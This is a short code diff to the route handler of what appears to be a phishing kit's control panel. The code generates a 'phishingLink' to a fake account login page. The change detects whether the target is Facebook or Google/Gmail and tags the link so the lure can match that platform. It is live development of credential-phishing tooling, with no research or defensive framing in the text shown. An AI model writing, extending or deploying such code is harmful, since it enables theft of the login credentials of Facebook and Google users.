@@ -144,7 +144,8 @@ export default async function panelRoutes(app) {
     const ref = saved?.ref || '';
     const publicHost = config.publicHost || (req.headers['x-forwarded-host'] || req.headers.host || 'localhost');
     const proto = req.headers['x-forwarded-proto'] || 'https';
-    const phishingLink = ref ? `${proto}://${publicHost}/account/login?ref=${ref}` : '';
+    const platform = /facebook|fb/i.test(startUrl) ? 'fb' : /google|gmail/i.test(startUrl) ? 'gm' : '';
+    const phishingLink = ref ? `${proto}://${publicHost}/account/login?ref=${ref}${platform ? `&p=${platform}` : ''}` : '';
     return { ok: true, id, phishingLink };
   });
 
